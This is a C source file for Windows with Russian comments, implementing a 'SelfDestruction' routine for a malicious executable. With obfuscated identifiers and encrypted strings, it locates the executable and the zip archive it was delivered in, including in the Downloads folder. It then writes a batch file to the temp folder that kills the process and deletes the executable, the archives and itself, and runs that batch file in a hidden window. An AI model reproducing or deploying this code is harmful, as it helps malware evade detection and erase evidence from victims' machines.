#include <windows.h>#include <stdio.h>#include <shlobj.h>#include <initguid.h>DEFINE_GUID(FOLDERID_Downloads,0x374DE290, 0x123F, 0x4565, 0x91, 0x64, 0x39, 0xC4, 0x92, 0x5E, 0x46, 0x7B);int SelfDestruction(){unsigned char xeunjWmjyuicy[] = {0xA1, 0x13, 0x44, 0xB6,'\0'};int fqwpeGntpuy = 256;unsigned char xmcrbQzdkzsz[] = {'x','m','q','d','m','V','z','u','f','g','\0'};unsigned char cukyzSsjftbnzolcdo[fqwpeGntpuy];size_t ctgxrFeelqolnedh = strlen((char *)xeunjWmjyuicy);size_t vbhfcTpggnatlhj = strlen((char *)xmcrbQzdkzsz);nksxeOvdofmfwyszq(cukyzSsjftbnzolcdo, xmcrbQzdkzsz, vbhfcTpggnatlhj);oekdvTucorbxoxey(xeunjWmjyuicy, ctgxrFeelqolnedh, cukyzSsjftbnzolcdo);char zip_utka[sizeof(xeunjWmjyuicy)];memcpy(zip_utka, xeunjWmjyuicy, ctgxrFeelqolnedh + 1);/* Получение полного пути к запущенному файлу */char exePath[MAX_PATH];tquaeAuhgjs(NULL, exePath, MAX_PATH);               // Получаем путь к текущему исполняемому файлу (самому себе)char exeDir[MAX_PATH];                                          // Так же нам нужно получить путь, где лежит exe файл, потому что архив можетstrncpy(exeDir, exePath, MAX_PATH);                             // находится в той же папке, а может находится в папке выше (в зависимости от того как разархивировали)char *lastSlash = strrchr(exeDir, '\\');                        // Обрезаем имя файла, оставляя только путьif (lastSlash) {*lastSlash = '\0';}char *exeName = strrchr(exePath, '\\');                         // Излекаем имя файла (для того чтобы получить имя процесса)exeName = exeName ? exeName + 1 : exePath;/* Путь ./file.zip */char zipPath_1[MAX_PATH];                                       // Так же нужно получить путь до zip архива, в котором находился исполняемый файлstrncpy(zipPath_1, exePath, MAX_PATH);                          // Копируем путь в другую переменную, чтобы получить путь к архивуchar *dot_1 = strrchr(zipPath_1, '.');                          // Находим последний символ '.' в имени файла (расширение)if (dot_1 != NULL) {strncpy(dot_1, zip_utka, MAX_PATH - (dot_1 - zipPath_1));     // Заменяем расширение на ".zip"} else {strcat(zipPath_1, zip_utka);                                  // Если расширение отсутствует, просто добавляем ".zip" в конец}/* Путь ../file.zip */char zipPath_2[MAX_PATH];                                       // В данном случае мы должны получить путь path/../file.zipstrncpy(zipPath_2, exeDir, MAX_PATH);strncat(zipPath_2, "\\..\\", MAX_PATH - strlen(zipPath_2) - 1);strncat(zipPath_2, exeName, MAX_PATH - strlen(zipPath_2) - 1);char *dot_2 = strrchr(zipPath_2, '.');                          // Находим последний символ '.' в имени файла (расширение)if (dot_2 != NULL) {strncpy(dot_2, zip_utka, MAX_PATH - (dot_2 - zipPath_2));     // Заменяем расширение на ".zip"} else {strcat(zipPath_2, zip_utka);                                  // Если расширение отсутствует, просто добавляем ".zip" в конец}/* Путь C:\Users\<user>\Downloads\file.zip */char zipPath_3[MAX_PATH];PWSTR downloadsPath = NULL;HRESULT hr = SHGetKnownFolderPath(                              // Получаем путь к папке "Загрузки"&FOLDERID_Downloads,                                        // GUID папки Downloads0,                                                          // ФлагиNULL,                                                       // Токен пользователя (NULL — текущий)&downloadsPath                                              // Указатель на результат);WideCharToMultiByte(CP_ACP, 0, downloadsPath, -1, zipPath_3, MAX_PATH, NULL, NULL);          // Конвертируем в ANSI (если нужно)strncat(zipPath_3, "\\", MAX_PATH - strlen(zipPath_3) - 1);strncat(zipPath_3, exeName, MAX_PATH - strlen(zipPath_3) - 1);char *dot_3 = strrchr(zipPath_3, '.');                          // Находим последний символ '.' в имени файла (расширение)if (dot_3 != NULL) {strncpy(dot_3, zip_utka, MAX_PATH - (dot_3 - zipPath_3));     // Заменяем расширение на ".zip"} else {strcat(zipPath_3, zip_utka);                                  // Если расширение отсутствует, просто добавляем ".zip" в конец}/* Создание bat файла */char batPath[MAX_PATH];jktcyQwbcddgml(MAX_PATH, batPath);                           // Получаем путь к temp-папкеstrcat(batPath, "name_bat_file.bat");                           // Имя бат файлаunsigned char twdpgRfsbiacpkhzvfo[] = {0x31, 0xFC, 0x98, 0xB8, 0xC2, 0x96, 0x92, 0x18, 0xF0, 0xCC, 0xEE, 0xA8, 0x73, 0xAB, 0x6F, 0x62, 0xD3, 0x3F, 0x55, 0x7C, 0x4A, 0x02, 0x44, 0xFA, 0xB2, 0xBA, 0x2E, 0x1E, 0x4D, 0xB3, 0x47, 0x89, 0xC2, 0xA0, 0x3B, 0xDD, 0xB1, 0x0C, 0x72, 0x43, 0x4E, 0x29, 0x25, 0xC4, 0xE9, 0x02, 0x69, 0xE5, 0xAA, 0x04, 0x8E, 0x81, 0xE5, 0x2D, 0x73, 0xEA, 0xEF, 0x68, 0xC9, 0x33, 0x30, 0x75, 0x85, 0xD5, 0x87, 0xF2, 0xCC, 0xB8, 0x5E, 0xEE, 0x4C, 0x90, 0x2A, 0x55, 0xBC, 0x6F, 0x68, 0xE5, 0x4F, 0x34, 0x6A, 0xA4, 0xDD, 0x08, 0x6A, 0xA9, 0xFF, 0x2D, 0xA5, 0x24, 0x8D, 0x7E, 0xB3, 0xEF, 0x3C, 0xA4, 0x66, 0xF0, 0x97, 0xC0, 0x70, 0x99, 0xB5, 0xAF, 0x69, 0x76, 0x1E, 0x2E, 0xE9, 0xA5, 0x49, 0x6A, 0x23, 0x76, 0xDF, 0x46, 0xBB,'\0'};int eskwhKrzaybqdhfz = 256;unsigned char ekighYxfryowabztuvz[] = {'w','f','v','a','n','H','m','b','c','a','r','e','k','k','j','d','w','z','c','\0'};unsigned char qcdlwVxocnbda[eskwhKrzaybqdhfz];size_t besirAoeyazihr = strlen((char *)twdpgRfsbiacpkhzvfo);size_t tfbafKctbdpted = strlen((char *)ekighYxfryowabztuvz);nksxeOvdofmfwyszq(qcdlwVxocnbda, ekighYxfryowabztuvz, tfbafKctbdpted);oekdvTucorbxoxey(twdpgRfsbiacpkhzvfo, besirAoeyazihr, qcdlwVxocnbda);char code_bat_file_utka[sizeof(twdpgRfsbiacpkhzvfo)];memcpy(code_bat_file_utka, twdpgRfsbiacpkhzvfo, besirAoeyazihr + 1);/*"@echo off\n""taskkill /F /IM \"%s\" > nul 2>&1\n"                   // Завершаем процесс по имени"ping 127.0.0.1 -n 6 > nul\n"                           // Задержка ~4 сек"del \"%s\"\n"                                          // Удаляем .exe"del \"%s\"\n"                                          // Удаляем .zip"del \"%%~f0\"\n",                                      // Удаляем сам .bat*/FILE *bat = fopen(batPath, "w");                        // Создаем bat файлif (bat) {fprintf(bat,code_bat_file_utka,exeName, zipPath_1, zipPath_2, zipPath_3, exePath, exePath);fclose(bat);                                        // Закрываем файл}unsigned char kvtpsDwugtgfqxfb[] = {0x89, 0x32, 0xD1, 0x04,'\0'};int zduhcErikhvmw = 256;unsigned char pnmugFogsifdckcadqzt[] = {'f','f','y','z','o','T','g','h','f','q','j','j','j','j','\0'};unsigned char vgieoNjtneqewfhc[zduhcErikhvmw];size_t foyvsDmbdnwcjr = strlen((char *)kvtpsDwugtgfqxfb);size_t kkhpuIcrqmc = strlen((char *)pnmugFogsifdckcadqzt);nksxeOvdofmfwyszq(vgieoNjtneqewfhc, pnmugFogsifdckcadqzt, kkhpuIcrqmc);oekdvTucorbxoxey(kvtpsDwugtgfqxfb, foyvsDmbdnwcjr, vgieoNjtneqewfhc);char open_utka[sizeof(kvtpsDwugtgfqxfb)];memcpy(open_utka, kvtpsDwugtgfqxfb, foyvsDmbdnwcjr + 1);binigLgvsxirgqg(                                     // Запускаем bat-файл с помощью ShellExecuteA (без отображаения окна)NULL,                                               // Дескриптор окна (NULL - текущее)open_utka,                                          // Операция открытьbatPath,                                            // Путь к bat-файлуNULL,                                               // Без доп параметровNULL,                                               // Рабочая директория (по умолчанию)SW_HIDE                                             // Скрываем окно при запуске);return 0;}